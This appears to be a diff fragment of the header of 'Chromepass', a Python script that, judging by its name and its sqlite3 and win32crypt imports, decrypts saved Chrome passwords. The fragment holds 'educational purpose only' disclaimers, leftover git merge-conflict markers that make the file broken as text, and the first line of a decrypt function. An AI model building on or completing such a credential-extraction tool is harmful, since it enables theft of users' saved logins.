@@ -1,8 +1,12 @@
-# Chromepass
+# Chromepass The best wy
 #Educational Purpose only, Avoid Illeagal  means
+<<<<<<< HEAD
 #If error found Report, contact us
 #Avoid For illeagal use.
 #indian use
+=======
+#If error found Report, contact us Avoid For illeagal use
+>>>>>>> tf
 import sqlite3, win32crypt, os, sys
 
 def decrypt(path, save_path):
